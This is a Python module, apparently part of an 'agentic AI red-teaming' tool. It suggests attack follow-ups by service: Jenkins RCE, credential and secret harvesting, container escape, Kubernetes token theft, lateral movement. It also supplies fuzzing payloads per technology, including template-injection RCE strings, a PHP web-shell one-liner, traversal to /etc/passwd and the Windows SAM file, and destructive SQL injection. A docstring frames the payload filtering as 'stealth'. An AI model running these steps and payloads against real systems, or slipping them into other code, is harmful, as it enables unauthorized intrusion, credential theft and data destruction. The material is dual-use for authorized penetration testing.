"""
Weissman-cybersecurity: Agentic AI Red-Teaming controller.
Analyzes findings and suggests "next steps" (lateral movement, credential hunting).
Provides contextual fuzzer payloads per technology stack for guided fuzzing.
"""
from __future__ import annotations

import json
import logging
import os
import tempfile
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Next steps: given a finding (port, service, tech), return actionable steps
# ---------------------------------------------------------------------------

SERVICE_NEXT_STEPS: dict[str, list[str]] = {
    "jenkins": [
        "Check /scriptApproval for Groovy script execution (RCE).",
        "Enumerate /job/*/config.xml for secrets and credentials.",
        "Test default credentials (admin:admin, jenkins:jenkins).",
        "Look for /credentials/store/ for leaked API keys.",
    ],
    "docker": [
        "Check for unauthenticated Docker API (port 2375/2376).",
        "Enumerate /containers/json for running containers.",
        "Attempt container escape if API is exposed.",
    ],
    "kubernetes": [
        "Check for exposed kubelet (10250) or kube-api (6443).",
        "Look for service account tokens in /var/run/secrets.",
        "Enumerate pods and exec into containers if auth is weak.",
    ],
    "redis": [
        "Test unauthenticated access (default no auth).",
        "Check CONFIG GET for sensitive paths.",
        "Attempt RCE via Lua sandbox or module load.",
    ],
    "elasticsearch": [
        "Check for unauthenticated 9200; enumerate indices.",
        "Look for sensitive data in _search and _cat/indices.",
        "Test for SSRF or RCE via script engines.",
    ],
    "mysql": ["Test default root with empty password.", "Enumerate users and hashes."],
    "postgresql": ["Test postgres/postgres and other default creds.", "Check for COPY from program (RCE)."],
    "mongodb": ["Test unauthenticated 27017; enumerate databases.", "Check for default no-auth deployment."],
    "nginx": [
        "Check for server-status, stub_status (info leak).",
        "Look for misconfigured alias (LFI).",
        "Test for CRLF injection in headers.",
    ],
    "apache": [
        "Check server-status, server-info (info leak).",
        "Look for .htaccess and backup files (.bak).",
        "Test for CVE in mod_* modules.",
    ],
    "tomcat": [
        "Check /manager/html for default creds (tomcat:tomcat).",
        "Look for WAR upload and RCE.",
        "Enumerate /host-manager.",
    ],
    "gitlab": [
        "Check for LFI in import (CVE history).",
        "Enumerate projects and CI variables for secrets.",
        "Test password reset and token leakage.",
    ],
    "jira": [
        "Check for SSRF in webhook/avatar URLs.",
        "Enumerate users and default templates.",
        "Look for plugin RCE (ScriptRunner, etc.).",
    ],
    "confluence": [
        "Check OGNL injection in preauth (CVE).",
        "Enumerate spaces for sensitive content.",
        "Test default admin credentials.",
    ],
    "grafana": [
        "Check for unauthenticated dashboards and datasources.",
        "Test for CVE in auth bypass (pre-auth).",
        "Enumerate API keys in config.",
    ],
    "kibana": [
        "Check for unauthenticated access and saved objects.",
        "Test for SSRF in Timelion/Canvas.",
        "Look for credential disclosure in discover.",
    ],
    "prometheus": [
        "Check for unauthenticated /api/v1/query (metrics leak).",
        "Test for injection in PromQL.",
    ],
    "ssh": ["Attempt default or weak credentials.", "Check for user enum and key leak."],
    "ftp": ["Test anonymous login.", "Check for credential reuse."],
    "smtp": ["Enumerate users via VRFY/EXPN.", "Check for open relay."],
    "ldap": ["Anonymous bind; enumerate users and groups.", "Check for credential in LDAP tree."],
    "default": [
        "Enumerate version and check for known CVEs.",
        "Look for default credentials and admin panels.",
        "Check for backup/config files (.bak, .old, .env).",
    ],
}


def _normalize_tech(t: str) -> str:
    return (t or "").strip().lower().replace(" ", "_")


def get_next_steps(
    port: int | None = None,
    service: str | None = None,
    tech_stack: list[str] | None = None,
    finding_summary: str | None = None,
) -> list[dict[str, Any]]:
    """
    Autonomous exploit logic: given a finding, return structured "next steps"
    (e.g. "If port 8080 is Jenkins, check for leaked credentials to move laterally").
    Returns list of { "action": str, "rationale": str, "priority": "high"|"medium"|"low" }.
    """
    steps: list[dict[str, Any]] = []
    combined = []
    if service:
        combined.append(_normalize_tech(service))
    if tech_stack:
        combined.extend([_normalize_tech(t) for t in tech_stack])
    if port:
        if port in (8080, 8081):
            combined.append("jenkins")
        elif port == 2375:
            combined.append("docker")
        elif port == 6379:
            combined.append("redis")
        elif port == 9200:
            combined.append("elasticsearch")
        elif port == 27017:
            combined.append("mongodb")
        elif port == 3000:
            combined.append("grafana")
        elif port == 5601:
            combined.append("kibana")
        elif port == 9090:
            combined.append("prometheus")
    seen_actions: set[str] = set()
    for tech in combined:
        for key, actions in SERVICE_NEXT_STEPS.items():
            if key in tech or tech in key:
                for i, action in enumerate(actions):
                    if action not in seen_actions:
                        seen_actions.add(action)
                        steps.append({
                            "action": action,
                            "rationale": f"Service/tech suggests: {key}",
                            "priority": "high" if i < 2 else "medium",
                        })
                break
    if not steps:
        for action in SERVICE_NEXT_STEPS["default"]:
            steps.append({
                "action": action,
                "rationale": "Generic recon",
                "priority": "medium",
            })
    return steps[:15]


# ---------------------------------------------------------------------------
# Contextual fuzzer payloads: STRICT per tech — no cross-contamination (IIS vs Apache/PHP).
# ---------------------------------------------------------------------------

# Aliases: map fingerprint names to canonical keys so we pick the right payload set only.
TECH_PAYLOAD_ALIASES: dict[str, str] = {
    "iis": "iis",
    "internet_information_services": "iis",
    "windows": "iis",
    "asp.net": "dotnet",
    "aspnet": "dotnet",
    "dotnet": "dotnet",
    ".net": "dotnet",
}

TECH_PAYLOADS: dict[str, list[str]] = {
    "jenkins": [
        "${script}",
        "{{7*7}}",
        "#{7*7}",
        "<%= 7*7 %>",
        "${class.getClass().forName('java.lang.Runtime').getMethod('exec','java.lang.String')}",
        "*/import java.lang.*;/*",
    ],
    "nginx": ["../", "....//....//etc/passwd", "%2e%2e%2f", "\\x00"],
    "apache": ["../", ".%2e/%2e%2e/%2e%2e/etc/passwd", "expect://id"],
    "php": ["' OR '1'='1", "<?php system($_GET['c']); ?>", "${phpinfo()}", "{{7*7}}"],
    "iis": [
        "%2e%2e%5c%2e%2e%5c",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "<% Response.Write(7*7) %>",
        "<%= 7*7 %>",
        "|cmd",
        "%00",
    ],
    "dotnet": [
        "<%= 7*7 %>",
        "${7*7}",
        "#{7*7}",
        "{{7*7}}",
        "@(7*7)",
        "Response.Write(7*7)",
    ],
    "node": ["{{constructor.constructor('return process.env')()}}", "{{this.constructor.constructor('return process')()}}"],
    "python": ["{{config.items()}}", "{{''.__class__.__mro__[1].__subclasses__()}}", "{{request.application.__globals__}}"],
    "java": ["${7*7}", "#{7*7}", "${T(java.lang.Runtime).getRuntime().exec('id')}"],
    "graphql": ["{__schema{types{name}}}", "{user(id:1){password}}", "' OR 1=1 --"],
    "elasticsearch": ["{\"script\":\"java.lang.Runtime.getRuntime().exec('id')\"}", "{\"query\":{\"match_all\":{}}}"],
    "redis": ["CONFIG GET dir", "EVAL \"return redis.call('config','get','dir')\" 0"],
    "sql": ["' OR 1=1--", "1; DROP TABLE users--", "1 UNION SELECT * FROM information_schema.tables--"],
    "default": [
        "'",
        "\"",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "%00",
        "{{7*7}}",
        "${7*7}",
    ],
}


def get_fuzzer_payloads_for_tech(tech_stack: list[str] | None) -> list[str]:
    """
    STRICT context-aware: return ONLY payloads for the identified tech stack.
    If target is IIS/dotnet, do NOT send Apache/PHP payloads (stealth + efficiency).
    Used by Rust fuzzer via FUZZ_PAYLOADS_FILE; fingerprint must run first.
    """
    if not tech_stack:
        return list(TECH_PAYLOADS["default"])
    seen: set[str] = set()
    payloads: list[str] = []
    for t in tech_stack:
        key = _normalize_tech(t)
        canonical = TECH_PAYLOAD_ALIASES.get(key) or key
        for tech_key, plist in TECH_PAYLOADS.items():
            if tech_key == "default":
                continue
            if canonical == tech_key or tech_key in key or key in tech_key:
                for p in plist:
                    if p and p not in seen:
                        seen.add(p)
                        payloads.append(p)
                break
    if not payloads:
        return list(TECH_PAYLOADS["default"])
    return payloads[:200]


def write_fuzzer_payloads_file(tech_stack: list[str] | None) -> str | None:
    """
    Write contextual payloads to a temp file (one per line). Returns path.
    Rust fuzzer can read FUZZ_PAYLOADS_FILE and use these in addition to built-in mutations.
    """
    payloads = get_fuzzer_payloads_for_tech(tech_stack)
    if not payloads:
        return None
    try:
        fd, path = tempfile.mkstemp(suffix=".txt", prefix="weissman_fuzz_")
        with os.fdopen(fd, "w") as f:
            for p in payloads:
                f.write(p.replace("\n", " ") + "\n")
        return path
    except Exception as e:
        logger.warning("Failed to write fuzzer payloads file: %s", e)
        return None
